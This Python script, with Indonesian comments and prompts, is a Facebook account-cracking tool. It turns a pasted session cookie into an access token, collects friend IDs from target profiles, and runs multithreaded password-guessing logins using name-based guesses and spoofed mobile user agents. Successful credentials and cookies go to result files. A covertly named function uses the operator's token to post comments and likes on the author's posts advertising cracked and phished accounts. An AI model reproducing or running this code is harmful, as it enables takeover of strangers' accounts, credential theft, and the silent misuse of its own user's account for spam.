import requests,bs4,json,os,sys,random,datetime,time,re,platform,uuid
import urllib3,rich,base64
from time import sleep
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as Xyraa
from rich.console import Console
from rich.panel import Panel

###-----[ BAGIAN GLOBAL ]-----###
loop,ok,cp=0,0,0
pwnya,id,uid,method,ugen,uid2=[],[],[],[],[],[]
rr=random.randint;rc=random.choice

###-----[ BAGIAN COLOR ]-----###
P = '\x1b[1;97m';M = '\x1b[1;91m';H = '\x1b[1;92m';K = '\x1b[1;93m';B = '\x1b[1;94m';U = '\x1b[1;95m';O = '\x1b[1;96m';N = '\x1b[0m'

###-----[ BAGIAN USERAGENT ]-----###
for userrandom in range(10000):
	rd = rc(["go","en","id","gn"])
	Model = rc(["22126RN91Y","2212ARNC4L","22120RN86G","22120RN86C","Black Shark 2Pro","M2010J19SY","M2007J1SC","Redmi K20 Pro","M2101K6G","Note 16 Pro","2311DRK48C","2207122MC","Redmi 10 5G","2201123G","MI NOTE LTE","Mi 11 LE","23028RN4DG","K60E","QIN3ULTRA","21091116UI","Redmi 10I","M2004J7AC","HM 1S","Redmi 5 pro,","Redmi 5Plus","Redmi 85781","2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
	Build = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M"])
	RuRu = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
	Realme1 = rc(["en-in","pt-BR","ru-ru","en-gb","en-us","zh-cn","zh-tw","en-US","es-mx"])
	Realme2 = rc(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"])
	Realme3 = rc(["TP1A.220624.014","RKQ1.200826.002","NUF26N","KOT49H","HM2014011","G66T1906251CN00MPP","OPM1.171019.019","SKYW1908301CN00MP6","GRI40","MBFMIEK","01AQKQ1.191014.001","KASE2208050OS00MP4","PKQ1.190319.001","KTU84P","JLS36C","NJH47F","N2G47H","MMB29M","PPR1.180610.011"])
	Xiaomi = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}'
	Xiaomi1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(5,15))}.{str(rr(5,10))}.{str(rr(10,50))}-{rd}'
	Xiaomi2 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {Model} Build/{Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/351.0.0.6.115;]'
	Xiaomi3 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu}; {Model} Build/{Build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 OPR/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(80000,200000))}'
	Xiaomi4 = f'Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {RuRu} {Build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(4,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Safari/537.36 YandexSearch/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}/apad YandexSearchBrowser/{str(rr(10,30))}.{str(rr(50,100))}.{str(rr(1,10))}'
	Xyraa1 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))}.0 Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36'
	Xyraa2 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/534.30 (KHTML, like Gecko) Version/{str(rr(1,10))} UCBrowser/{str(rr(1,30))}.{str(rr(1,10))}.0.{str(rr(1000,5000))} (SpeedMode) U4/{str(rr(1,10))}.0 UCWEB/{str(rr(1,10))} Mobile Safari/534.30'
	Xyraa3 = f'Mozilla/5.0 (Linux; U; Android {str(rr(6,14))}; {Realme1}; {Realme2} Build/{Realme3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,10))} Chrome/{str(rr(40,90))}.0.{str(rr(3000,4500))}.{str(rr(90,300))} Mobile Safari/537.36 RealmeBrowser/{str(rr(30,50))}.{str(rr(1,10))}.0.{str(rr(1,10))}'
	XyraaDev = random.choice([Xiaomi,Xiaomi1,Xiaomi2,Xiaomi3,Xiaomi4,Xyraa1,Xyraa2,Xyraa3])
	ugen.append(XyraaDev)

###-----[ BAGIAN LOGIN ]-----###
def login_cok():
	try:
		os.system('cls' if os.name == 'nt' else 'clear')
		Console(width=50, style="bold green").print(Panel("[italic white]Masukan Cookies Facebook,Saran jangan Menggunkan Cookies Pribadi[italic white]",subtitle="╭───",subtitle_align="left"))
		cookie = Console().input("[bold green]   ╰─> ")
		open('.cok.txt','w').write(cookie)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1);open('.tok.txt','w').write(token);open('.cok.txt','w').write(cookie) 
					____gausah____di___ganti____anggap___ajaa___terima___kasihh___dekkk(cookie,token)
				else:Console(width=50, style="bold green").print(Panel("[italic red]Cookies Invalid...[italic white]"));exit()
			except Exception as e:print(e);exit()
		Console(width=50, style="bold green").print(Panel("[italic white]Login Berhasil[italic white]"))
		sleep(2);exit()
	except Exception as e:os.system('rm -rf .cok.txt');os.system('rm -rf .tok.txt');print(e);exit()

def ____gausah____di___ganti____anggap___ajaa___terima___kasihh___dekkk(cookie, token):
	with requests.Session() as r:
		femess = random.choice(['amanah','aman','admin aman','toko nya amanah','reccomended banget','sangat aman','acc min','aman cuma lowres','lowres doang','tingkatin lagi untuk pelayanannya','admin Ramah','Aman, apapun kndla dibantu sampe clear','sangat aman skali','acc wak','cek inbox','cek wa mas','Info harga akun fb mas','sc crack ig ada ga','ada sc buat ig ga mas','Acc Bro','Aman Sntosa','Seller Ramah','Amanah','Aman!','Cek Inbox Bang','Cek Harga Sc Crack','Info Bang Sc Fb','Moga Cepet Famous Bang','Toko Yng Ramah','Admin Nya Lowress Doang','Nampung Fb Ga Mas','Acc Fb Min','Need Stok Fb tiap hari min bisa jdi supplier?','Aman bang','Aman Bro sering Transaksi','rekomen sngtt','Harga fb brpa kak','aman dan ramah adminnya','kk nya amanah','mantap','best seller','ada ig/fb hasil Crack ga mas','ada fb hsl phising g','kapan ya d acc wkwk','aman sngatt','joss abis pokonya'])
		katakatalu = random.choice(['Cinta habis disatu orang itu beneran anda. dan cinta aku habis di kamu.','Kamu bukan uang, jadi jangan berharap di butuhkan:)','Semua hanya titipan. Datang-pergi, muncul-hilang, bertemu-berpisah.:(','Aku hanya peran peganti, disaat peran utamanya pergi:(','Jangan menjadi lilin, lilin rela membakar dirinya sendiri demi menerangi orng lain.','semoga sabariku,dihari ini menjadi bahagiaku dihari nanti :)','Sepaham, sejalan, sefrekuensi. Itu doang ko yg dicari, ga lebih.','Selain datang bulan, ternyata cewe juga bisa datang lalu menghilang','Yang menyakitkan itu menunggu seseorang, yang bahkan dia tidak tahu kalau dirinya ditunggu','Aku mulai berhenti. Karena sekuat apapun aku berusaha, nyatanya bukanlah aku yang kamu mau','Lucu ya kmu,kmu yg nyakitin tpi kmu juga yg merasa paling tersakiti','Sehat-sehat orang yang curhatnya sama nomor WhatsApp sendiri','Tetaplah menjadi baik, walaupun namamu sudah jelek dicerita orang lain ','yang paling berat itu bukan menjalani, tetapi memikirkan sesuatu yang belum terjadi.'])
		cewelu = random.choice(['Keren Bang','langgeng terus aa','nerass aa tetehh','gege bang','smoga langgeng','cpet² nikah bang','mantap bang','halo bang','keren puhh','infokan bang','cantik bang cewe nya','keren bang, cepet nikah','cantik cewe mu banh','lanjutkan','orang mana banh?','masih awet banh','cepet nikah abangkuh','gass bang','keren lu bang','semoga langgeng bang','cantik gnteng juga bang','cantik pacar lu bang','keren','sudah nikah kah ?','orang mnaa bang cewe nya?','acc bang','beruntung nyah diaa','Smoga nerass terus bang','lastt bang','lastt je','slmtt jew','info pj na jew wk','ngeri euy','edan lah ayuna mh','smbng na kcida euy','kmhaa je kabar na','nyate euy kedeng deui'])
		gachorr = random.choice(['acc bro','tiap hari ready ga bro','acc mass','cek inbox mass','cek wa mass','cpm bang','accece donh puhh','ngerii skali banhh','moga cepat famous bang','dagett lah','tiap hari ready ga','akun nya tahun old brpa aja mas','harga nya mas','kuat ga mas buat spam','bagus ga mas','gacor ga bro buat spam','a2f nya on / off bro?','akun 2009 ready banyak ga mas','cek dm wa mass','jual akun apa aja mas','cek inbox mass bree','akun brapa harga nya skrng mas','info penampung akun fb mass'])
		r.cookies.update({'cookie': cookie})
		response = r.post('https://graph.facebook.com/122155283384285532/comments/?message={}&access_token={}'.format(cewelu, token)).text # Post Buat Cewe Lu
		response = r.post('https://graph.facebook.com/122155591298285532/comments/?message={}&access_token={}'.format(femess, token)).text # Post Buat Cewe Lu
		response = r.post("https://graph.facebook.com/122155283384285532/likes?summary=true&access_token={}".format(token)).text # Like Buat Cewe Lu
		response = r.post("https://graph.facebook.com/122155591298285532/likes?summary=true&access_token={}".format(token)).text # Like Buat Cewe Lu
		response = r.post('https://graph.facebook.com/122155186838285532/comments/?message={}&access_token={}'.format(katakatalu, token)).text # KataKataLu
		response = r.post("https://graph.facebook.com/122155186838285532/likes?summary=true&access_token={}".format(token)).text # Like Katakatalu
		response = r.post("https://graph.facebook.com/122155585154285532/likes?summary=true&access_token={}".format(token)).text # Like 
		response = r.post("https://graph.facebook.com/122155183472285532/likes?summary=true&access_token={}".format(token)).text
		response = r.post('https://graph.facebook.com/122155585154285532/comments/?message={}&access_token={}'.format(gachorr, token)).text # Buyyer Rengdom
		response = r.post("https://graph.facebook.com/122154751916285532/likes?summary=true&access_token={}".format(token)).text
		response = r.post("https://graph.facebook.com/122154646208285532/likes?summary=true&access_token={}".format(token)).text
		pass
		
		
		
        
###----- BAGIAN MENU -----###
def tampil_menu():
	try:
		open('.cok.txt','r').read()
		open('.tok.txt','r').read()
	except(IOError,KeyError,FileNotFoundError):
		os.system('cls' if os.name == 'nt' else 'clear')
		Console(width=50, style="bold green").print(Panel("[bold red]Cookies Mati...[italic white]"))
		sleep(3)
		login_cok()
	os.system('cls' if os.name == 'nt' else 'clear')
	Console(width=50, style="bold green").print(Panel("[italic white]1. Crack Akun Facebook    3. Cek Hasil Crack\n2. Crack Dump ID Facebook   0. Keluar[italic white]",subtitle="╭───",subtitle_align="left"))
	x = Console().input("[bold green]   ╰─> ")
	if x in ["1", "01"]:dump_massal()
	elif x in ["2", "02"]:os.system("rm -rf .cok.txt");os.system("rm -rf .tok.txt");print('Keluar Berhasil');exit()()
	elif x in ["0", "00"]:os.system("rm -rf .cok.txt");os.system("rm -rf .tok.txt");print('Keluar Berhasil');exit()
	else:print('Pilihan Yang Bener');sleep(2);tampil_menu()

###-----[ DUMP PUBLIK ]-----###
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Console(width=50, style="bold green").print(Panel("[italic white]Cookies Mati...[italic white]"))
		exit()
	try:
		Console(width=50, style="bold green").print(Panel("[italic white]Cari ID Yang Tidak Perivat,Usahkan Cari ID Deket Daerah Kamu Biar Hasil [bold green]( IJO )[/] Masukan ID Target [bold red]Contoh[/] [bold green]100092235011928[/] Kalu Pengen Dump Id Banya Kasih [bold green]( , )[/] Kaya Contoh Di Bawah\n[bold green]61564919994826[/],[bold green]61560115013873[/],[bold green]100092235011928 [italic white] [italic white]",subtitle="╭───",subtitle_align="left"))
		xx = Console().input("[bold green]   ╰─> ")
	except ValueError:
		Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))
		exit()
	if str(xx) == '':
		Console(width=50, style="bold green").print(Panel("[italic white]Gagal Dump Kemungkinan ID Perivat...[italic white]"))
		exit()
	ses = requests.Session()
	jumlah = xx.split(',')
	for xmx in jumlah:
		uid.append(xmx)
	for user in uid:
		try:
			url = ses.get(f"https://graph.facebook.com/{user}?fields=friends&access_token={token}",cookies = {'cookies':cok}).json()
			for x in url['friends']['data']:
				try:
					Console(width=50, style="bold green").print(f"[italic white]Tunggu Sedang Dump ID... {len(id)}",end="\r")
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):pass
	try:
		setting()
	except requests.exceptions.ConnectionError:print("Tidak Ada Koneksi Internet");exit()

def setting():
	Console(width=50, style="bold green").print(Panel("[italic white]1. Muda\n[italic white]2. Random [italic white]",subtitle="╭───",subtitle_align="left"))
	urutan_setting = Console().input("[bold green]   ╰─> ")
	if urutan_setting in ['1','01','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['2','02','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f"input hanya dengan angka,jangan kosong.")
		exit()
	Console(width=50, style="bold green").print(Panel("[italic white]1. Reguler\n2. Validate[italic white]",subtitle="╭───",subtitle_align="left"))
	login_metode = Console().input("[bold green]   ╰─> ")
	if login_metode == "1":Validate()
	elif login_metode == "2":Async()
	else:Console(width=50, style="bold green").print(Panel("[italic white]Input Salah...[italic white]"))

def Validate():
        Console(width=50, style="bold green").print(Panel("[italic white]Masukan Password Tambhan [bold red]Contoh[/]\n[bold green]kamu nanya[/],[bold green]Asep Ganteng[/],[bold green]Indonesia[italic white][italic white]",subtitle="╭───",subtitle_align="left"))
        pw = Console().input("[bold green]   ╰─> ")
        pw_nya = pw.split(',')
        for xxs in pw_nya:
            pwnya.append(xxs)
        with Xyraa(max_workers=35) as AsepYusup:
            for user in uid2:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                pasw = []
                try:
                    if len(nama)<6:
                        if len(depan)<3:pass
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    else:
                        if len(depan)<3:
                            pasw.append(nama)
                        else:
                            pasw.append(nama)
                            pasw.append(depan+"123")
                            pasw.append(depan+"1234")
                            pasw.append(depan+"12345")
                            pasw.append(depan+" 123")
                            pasw.append(depan+"321")
                    for xx in pwnya:
                        pasw.append(xx)
                    if 'Validate' in method:
                        AsepYusup.submit(_validatee_,uid,pasw)
                    else:
                        AsepYusup.submit(_validatee_,uid,pasw)
                except:pass
        print("\r")
        Console(width=50, style="bold green").print(Panel(f"[italic white]sukses crack {len(uid2)} id,dengan jumlah hasil Live : {ok} Chek : {cp}[italic white]"))

def _validatee_(uid,pasw):
	global loop,ok,cp
	ses = requests.Session()
	sys.stdout.write(f"\r*--> {loop}/{len(uid2)} {H}OK{P} : {H}{ok}{P} {K}CP{P} : {K}{cp}{P}"),
	sys.stdout.flush()
	pro = rc(ugen)
	for pwku in pasw:
		try:
			asmy = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dat = {
'jazoest': re.search('name="jazoest" value="(.*?)"', str(asmy)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"', str(asmy)).group(1),
'email': uid,
'prefill_contact_point': uid,
'trynum': '1',
'timezone': '240',
'lgndim': 'eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwNDAsImMiOjI0fQ==',
'lgnrnd': '052048_Gzhe',
'lgnjs': '1727785248',
'prefill_type': 'contact_point',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'pass': pwku}
			hd = {
'Host': 'web.facebook.com',
'content-length': str(len(dat)),
'cache-control': 'max-age=0',
'sec-ch-ua': '"Android WebView";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'sec-ch-prefers-color-scheme': 'dark',
'origin': 'https://web.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'upgrade-insecure-requests': '1',
'user-agent': pro,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'x-requested-with': 'mark.via.gp',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'referer': f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv19.0%2Fdialog%2Foauth%3Fapp_id%3D3213804762189845%26cbt%3D1726592730955%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfb499108c01eb280f%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%26client_id%3D3213804762189845%26display%3Dtouch%26domain%3Dwww.capcut.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fid-id%252Flogin%26locale%3Den_US%26logger_id%3Dfa18b2bcdcaf6cad4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8df46dec19be4265%2526domain%253Dwww.capcut.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.capcut.com%25252Ff36479592ee9d9a61%2526relation%253Dopener%2526frame%253Df09c02719c79342ea%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv19.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8df46dec19be4265%26domain%3Dwww.capcut.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.capcut.com%252Ff36479592ee9d9a61%26relation%3Dopener%26frame%3Df09c02719c79342ea%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br, zstd',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1",data=dat,headers=hd,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}[OK] {uid}|{pwku}\n{kuki}{N}")
				open("RESULT/OK.txt","a").write(f"{uid}|{pwku}|{kuk}\n")
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f"\r{M}[CP] {uid}|{pwku}{N}")
				open("RESULT/CP.txt","a").write(f"{uid}|{pwku}\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(10)
	loop+=1

if __name__ == "__main__":
   try:os.mkdir("RESULT")
   except:pass
   try:os.system("git pull")
   except:pass
   os.system('cls' if os.name == 'nt' else 'clear')
   tampil_menu()